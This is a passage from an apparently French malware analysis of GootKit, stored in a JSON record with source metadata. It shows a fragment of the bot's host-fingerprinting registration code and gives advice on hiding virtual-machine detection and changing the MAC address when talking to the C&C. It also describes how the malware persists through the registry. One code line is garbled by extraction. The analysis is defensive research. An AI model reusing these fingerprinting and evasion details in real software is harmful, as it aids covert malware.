os.totalmem(),\n\n'networkInterfaces': getAdapters(),\n\n\n-----\n\nt pd os t p (),\n\n'cpus': process.cpus,\n\n'hostname': os.hostname(),\n\n'IsVirtualMachine' : vmx_detection.IsVirtualMachine()\n\n}\n\nreturn messages.Bot.encode(process.bot);\n\n}\n\nSi le script est exécuté sur une machine virtuelle, il faut prendre soin de forcer le champ IsVirtualMachine à false, et changer l’adresse MAC\nde la carte réseau pour être le plus discret possible.\n\nLes attributs version et g_botId de l’objet process sont définis de manière native dans la payload. La variable g_vendorName correspond à\nla variable d’environnement vendor_id définie par le loader.\n\nUne fois le paquet d’enregistrement envoyé, le C&C envoie un bout de code JavaScript qui sera chiffré et stocké dans le registre et exécuté au\ndémarrage par GootKit.\n\nPour terminer, le C&C envoie la configuration fonctionnelle, puis demande régulièrement une photo d’écran.\n\nLes autres commandes d’administration à distance sont déclenchées par l’attaquant.\n\n## Conclusion\n\nComme nous avons pu le voir, le loader de Gootkit est une pièce logicielle plutôt intéressante et en perpétuelle évolution. Son étude en\ncomplément de celle de la payload permet d'envisager une automatisation complète de la chaîne de récupération des configurations\ntechniques et fonctionnelles ainsi que du suivi et de l'analyse des évolutions de ce malware.\n\n## Références\n\n**[1] Thomas Chopitea, « Analyse d'un malware en Node.js », MISC n°92, juillet-août 2017**\n\n**[[2] Unicorn, the ultimate CPU emulator : https://www.unicorn-engine.org/](https://www.unicorn-engine.org/)**\n\n**[[3] PyDbg - A pure-python win32 debugger interface : https://github.com/OpenRCE/pydbg](https://github.com/OpenRCE/pydbg)**\n\n\n-----",
    "language": "FR",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-11-01 - GootKit Analysis (French).pdf"
    ],
    "report_names": [
        "2018-11-01 - GootKit Analysis (French).pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535938,
    "ts_updated_at": 1743041142,
    "ts_creation_date": 1653762132,
    "ts_modification_date": 1653762132,
    "files": {
        "pdf": "https://archive.orkl.eu/a98b9d1187694211195e7c3fa82908292eb66dab.pdf",
        "text": "https://archive.orkl.eu/a98b9d1187694211195e7c3fa82908292eb66dab.txt",
        "img": "https://archive.orkl.eu/a98b9d1187694211195e7c3fa82908292eb66dab.jpg"
    }
}